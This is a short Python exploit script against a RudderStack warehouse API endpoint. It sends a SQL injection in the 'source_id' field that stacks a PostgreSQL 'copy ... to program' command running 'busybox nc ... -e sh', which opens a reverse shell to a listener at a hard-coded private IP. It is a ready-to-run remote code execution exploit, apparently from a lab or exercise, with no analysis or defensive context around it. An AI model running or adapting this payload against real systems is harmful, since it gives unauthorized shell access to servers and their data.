#!/usr/bin/env python3

import requests
import traceback

def rce(lhost, lport):
    url = "http://rudderstack:80/v1/warehouse/pending-events?triggerUpload=true"
    headers = {"Content-Type": "application/json"}
    json={"source_id": f"' or 1=2; copy (select 'a') to program 'busybox nc {lhost} {lport} -e sh' -- - ", "task_run_id": "1"}
    try:
        print("[+] RCE payload sent. Check your listener!")
        print(f"[+] Listener {lhost}:{lport}")
        requests.post(url, headers=headers, json=json)
    except Exception as e:
        print("[-] Error sending the WAF bypass RCE request: ", e)
        traceback.print_exc()
    except KeyboardInterrupt:
        print("CTRL + c pressed. Exiting...")


if __name__ == "__main__":
    rce("192.168.45.203", "1337") # CHANGE ME
